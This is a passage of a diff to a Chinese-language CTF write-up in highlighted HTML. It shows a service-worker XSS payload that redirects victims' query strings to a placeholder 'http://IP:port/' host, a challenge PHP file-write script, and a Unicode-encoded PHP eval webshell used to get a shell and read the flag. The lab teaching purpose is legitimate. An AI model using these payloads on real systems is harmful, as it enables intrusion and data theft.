+</span></span><span class="line"><span class="cl">        <span class="nx">caches</span><span class="p">.</span><span class="nx">match</span><span class="p">(</span><span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">res</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">requestBackend</span><span class="p">(</span><span class="nx">event</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="p">)</span>
+</span></span><span class="line"><span class="cl">   <span class="p">});</span>
+</span></span><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">requestBackend</span><span class="p">(</span><span class="nx">event</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">var</span> <span class="nx">url</span> <span class="o">=</span> <span class="nx">event</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">clone</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">new</span> <span class="nx">Response</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;location=&#39;http://IP:port/&#39;+location.search;&lt;/script&gt;&#34;</span><span class="p">,</span> <span class="p">{</span><span class="nx">headers</span><span class="o">:</span> <span class="p">{</span> <span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span> <span class="s1">&#39;text/html&#39;</span> <span class="p">}})</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>然后放在https的站点上，发送框填入链接：</p>
 <blockquote>
@@ -594,41 +594,41 @@
 </span><span class="lnt">34
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="k">include</span> <span class="s1">&#39;security.php&#39;</span><span class="p">;</span>
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
-    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-    <span class="k">die</span><span class="p">();</span>
-<span class="p">}</span>
-<span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span><span class="o">.</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
-<span class="nx">var_dump</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">)){</span>
-    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$sandbox</span><span class="o">.</span><span class="s2">&#34;index.php&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-<span class="nv">$action</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span>
-<span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span>
-
-<span class="k">if</span><span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s2">&#34;write&#34;</span> <span class="o">&amp;&amp;</span>  <span class="nx">SecurityCheck</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span><span class="nx">SecurityCheck</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span><span class="nv">$content</span><span class="p">)){</span>
-    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
-    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
-    <span class="nv">$filecontent</span> <span class="o">=</span> <span class="nv">$content</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
-    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
-    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$filecontent</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2"> Powered By Dbapp OSS.&#34;</span><span class="p">);</span>
-<span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s2">&#34;reset&#34;</span><span class="p">){</span>
-    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
-    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
-        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
-            <span class="k">if</span><span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">){</span>
-                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
-            <span class="p">}</span>
-        <span class="p">}</span>
-    <span class="p">}</span>
-<span class="p">}</span>
-<span class="k">else</span><span class="p">{</span>
-    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Security Check Failed.&#39;</span><span class="p">);</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;security.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">show_source</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$sandbox</span> <span class="o">=</span> <span class="s1">&#39;sandbox/&#39;</span><span class="o">.</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">])</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">var_dump</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">file_exists</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$sandbox</span><span class="o">.</span><span class="s2">&#34;index.php&#34;</span><span class="p">,</span><span class="s2">&#34;&lt;?php echo &#39;Welcome To Dbapp OSS.&#39;;?&gt;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$action</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;action&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="s2">&#34;php://input&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s2">&#34;write&#34;</span> <span class="o">&amp;&amp;</span>  <span class="nx">SecurityCheck</span><span class="p">(</span><span class="s1">&#39;filename&#39;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span><span class="nx">SecurityCheck</span><span class="p">(</span><span class="s1">&#39;content&#39;</span><span class="p">,</span><span class="nv">$content</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$content</span> <span class="o">=</span> <span class="nx">json_decode</span><span class="p">(</span><span class="nv">$content</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filecontent</span> <span class="o">=</span> <span class="nv">$content</span><span class="o">-&gt;</span><span class="na">content</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$filename</span> <span class="o">=</span> <span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$filename</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">file_put_contents</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span><span class="nv">$filecontent</span><span class="o">.</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2"> Powered By Dbapp OSS.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span><span class="k">elseif</span><span class="p">(</span><span class="nv">$action</span> <span class="o">==</span> <span class="s2">&#34;reset&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$files</span> <span class="o">=</span> <span class="nx">scandir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">foreach</span><span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">is_dir</span><span class="p">(</span><span class="nv">$file</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nv">$file</span> <span class="o">!==</span> <span class="s2">&#34;index.php&#34;</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="nx">unlink</span><span class="p">(</span><span class="nv">$sandbox</span><span class="o">.</span><span class="nv">$file</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Security Check Failed.&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>      在传入一句话木马时发现很多Unicode加密网站在加密时会自动将<code>&lt;&gt;</code>转化为<strong>HTML实体编码</strong>，这样会导致一句话木马无法执行，在此网站<a href="http://www.jsons.cn/unicode/" target="_blank" rel="noopener">http://www.jsons.cn/unicode/</a>生成的Unicode不会自动编码。</p>
 <div class="highlight"><div class="chroma">
@@ -637,9 +637,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="p">{</span><span class="s2">&#34;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&#34;</span><span class="o">:</span><span class="s2">&#34;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0063\u006d\u0064\u005d\u0029\u003b\u003f\u003e&#34;</span><span class="p">}</span>
-<span class="c1"># {&#34;content&#34;:&#34;&lt;?php eval($_POST[cmd])?&gt;&#34;}
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="p">{</span><span class="s2">&#34;\u0063\u006f\u006e\u0074\u0065\u006e\u0074&#34;</span><span class="o">:</span><span class="s2">&#34;\u003c\u003f\u0070\u0068\u0070\u0020\u0065\u0076\u0061\u006c\u0028\u0024\u005f\u0050\u004f\u0053\u0054\u005b\u0063\u006d\u0064\u005d\u0029\u003b\u003f\u003e&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># {&#34;content&#34;:&#34;&lt;?php eval($_POST[cmd])?&gt;&#34;}
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>getshell之后终端执行<code>/readflag</code>获取flag。</p>
 <h1 id="参考"><a href="#参考" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:参考" class="headings">参考</a></h1>
